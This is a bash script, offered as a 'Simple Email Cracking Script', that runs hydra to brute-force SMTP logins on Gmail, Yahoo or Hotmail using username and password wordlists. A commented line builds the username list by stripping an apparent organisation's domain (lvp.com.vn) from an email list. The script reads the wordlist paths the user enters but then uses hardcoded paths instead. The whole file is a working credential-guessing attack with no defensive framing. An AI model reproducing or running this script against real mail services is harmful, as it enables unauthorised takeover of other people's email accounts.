#!/bin/bash

echo Simple Email Cracking Script in bash
echo Enter SMTP:
echo Choose a SMTP service: Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com /:
read smtp
echo Enter Provide Directory of wordlist for Email Address:
read email
echo Provide Directory of wordlist for Passwords:
read wordlist

cd /root/Exploit/wordlist/

# cat email.lvp.com.vn | sed 's/@lvp.com.vn//g' | sort | uniq -c | awk '{ print $2 }' > /root/Exploit/wordlist/user_email.txt

#hydra -S -O -L $email -P $wordlist -e ns -V -s 587 $smtp smtp

hydra -S -O -L /root/Exploit/wordlist/user_email.txt -P /root/Exploit/wordlist/password_email.txt -e ns -V -s 587 $smtp smtp